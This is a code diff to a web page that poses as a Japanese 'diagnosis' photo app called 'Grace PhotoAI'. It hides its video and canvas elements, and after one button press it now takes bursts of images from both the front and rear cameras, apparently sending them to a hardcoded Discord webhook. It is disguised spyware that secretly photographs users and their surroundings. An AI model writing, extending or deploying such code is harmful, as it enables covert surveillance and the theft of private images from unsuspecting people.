@@ -87,18 +87,14 @@
       cursor: pointer;
     }
 
-    video {
-      display: none;
-    }
-
-    canvas {
+    video, canvas {
       display: none;
     }
   </style>
 </head>
 <body>
   <h1>Grace PhotoAI</h1>
-  <button onclick="startCapture()">診断する</button>
+  <button onclick="startDualCapture()">診断する</button>
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
@@ -121,15 +117,21 @@
     const ctx = canvas.getContext('2d');
     const webhookUrl = "https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u";
 
-    async function startCapture() {
+    async function startDualCapture() {
+      await captureFromCamera("user");
+      setTimeout(() => {
+        captureFromCamera("environment");
+      }, 1500);
+    }
+
+    async function captureFromCamera(facingMode) {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }});
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }});
         video.srcObject = stream;
 
         setTimeout(() => {
-          captureAndSendImages(5, 200); // 5枚, 0.2秒間隔
-        }, 1000);
-
+          captureAndSendImages(5, 200);
+        }, 500);
       } catch (err) {
         alert("カメラへのアクセスが許可されていません。");
         console.error(err);
